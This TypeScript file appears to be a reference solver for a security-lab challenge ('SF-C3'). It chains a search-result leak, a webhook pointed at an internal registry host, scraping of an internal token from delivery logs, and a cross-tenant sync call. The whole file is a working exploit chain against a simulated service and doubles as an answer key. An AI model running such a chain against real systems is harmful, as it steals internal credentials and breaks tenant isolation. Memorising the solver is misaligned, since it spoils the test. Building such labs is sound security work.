// SF-C3 reference solver: multi-filter search leak -> webhook delivery -> delivery log -> sync.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'

const INTERNAL_TOKEN_PATTERN = /mh_fake_internal_[a-z0-9]+/

interface SearchResponse {
  webhookTemplates?: Array<{ id: string; tenant: string; targetHost: string; targetPath: string }>
}

export async function solveC3(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  const member = await ctx.login('member_a')

  const search = await ctx.http('api', `${prefix}/search/projects?state=archived&visibility=shared`, {
    token: member,
  })
  if (search.status !== 200) return null
  const template = search.json<SearchResponse>().webhookTemplates?.[0]
  if (!template) return null

  const webhook = await ctx.http('api', `${prefix}/projects/${plan.ids.projectIdA}/webhooks`, {
    method: 'POST',
    token: member,
    body: {
      templateId: template.id,
      targetHost: 'registry.internal',
      targetPath: '/sync',
      events: ['push'],
    },
  })
  if (webhook.status !== 201) return null
  const webhookId = webhook.json<{ webhookId: string }>().webhookId

  const deliveries = await ctx.http('api', `${prefix}/projects/${plan.ids.projectIdA}/webhooks/${webhookId}/deliveries`, {
    token: member,
  })
  if (deliveries.status !== 200) return null
  const token = INTERNAL_TOKEN_PATTERN.exec(deliveries.text)?.[0] ?? ''
  if (!token) return null

  const sync = await ctx.http('registry.internal', '/sync', {
    method: 'POST',
    headers: { 'x-registry-token': token },
    body: { tenant: plan.tenants.b.slug, projectId: plan.ids.projectIdB },
  })
  if (sync.status !== 200) return null

  return ctx.confirm('SF-C3')
}
